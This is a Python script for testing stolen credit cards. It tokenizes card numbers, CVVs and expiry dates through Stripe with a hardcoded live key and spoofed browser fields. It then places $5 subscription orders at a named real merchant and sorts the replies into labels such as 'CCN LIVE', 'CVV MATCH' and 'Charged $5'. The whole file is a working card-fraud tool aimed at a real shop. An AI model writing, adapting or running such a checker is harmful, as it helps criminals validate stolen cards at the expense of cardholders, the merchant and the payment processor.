import requests

# from mills.plugins._helpers.tools import find_between


def str_one(cc, mes, ano, cvv, rand_user):
    payload_a = {
'card[name]': rand_user['name'],
'card[address_line1]': rand_user['street'],
'card[address_line2]': '',
'card[address_city]': rand_user['city'],
'card[address_state]': rand_user['state'],
'card[address_country]': 'US',
'card[number]': cc,
'card[cvc]': cvv,
'card[exp_month]': mes,
'card[exp_year]': ano,
'card[address_zip]': rand_user['zip'],
'email': rand_user['email'],
# 'guid': 'd034832b-5165-42f8-a8dc-a266685f49ee852af3',
# 'muid': '9ea9ec0b-dfce-495c-a5a5-0525d432656ce01980',
# 'sid': '70b6c49f-4e33-4ea4-ad29-f04b7ac2f6044408c2',
'payment_user_agent': 'stripe.js/394a74bde; stripe-js-v3/394a74bde',
'time_on_page': '121508',
'key': 'pk_live_z1MeDxMEanz7RLErN0CGKqWG',
'pasted_fields': 'number',
}

    a = requests.post('https://api.stripe.com/v1/tokens', data = payload_a)
    return a.json()






def str_two(token, rand_user):
    payload_b = {
    "first_name": rand_user['first_name'],
    "last_name": rand_user['last_name'],
    "street_address": rand_user['street'],
    "street_address_2": "",
    "city": rand_user['city'],
    "state": rand_user['province'],
    "postal_code": rand_user['zip'],
    "email": rand_user['email'],
    "products": [],
    "donation": 0,
    "subscription_tiers": [
        {
            "id": 21,
            "subscription_id": 5,
            "monthly_price": 500,
            "stripe_plan_id": "plan_GKtnUZ9jiFf44G",
            "created_at": "2019-11-21T03:45:34.769Z",
            "updated_at": "2019-12-10T19:03:37.253Z"
        }
    ],
    "stripeToken": token
}
    b = requests.post('https://shop.upbring.org/orders', json = payload_b)
    return b.json()




def get_response_str(text: str):
    if "card was declined" in text or 'card_declined' in text or 'The transaction has been declined' in text or 'Processor Declined' in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'DECLINED'
    elif 'Your card number is incorrect' in text or 'Call to a member function attach() on null' in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'DECLINED'
    elif 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV MATCH'
    elif "card has insufficient funds" in text or 'insufficient_funds' in text or 'Insufficient Funds' in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV MATCH'
    elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN Match'
    elif "card does not support this type of purchase" in text or 'transaction_not_allowed' in text or 'Transaction Not Allowed' in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'DECLINED'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'DECLINED'
    elif "card has expired" in text or 'Expired Card' in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'DECLINED'
    elif 'Donation Confirmation' in text or "This page doesn't seem to exist" in text or 'seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "Charged $5", "✅", 'CVV MATCH'
    else:
        r_text, r_logo, r_respo = 'UNKOWN RESPONSE', "❌", 'DECLINED'
    r_text1 = text.strip() if text else r_text
    return r_text1, r_logo, r_respo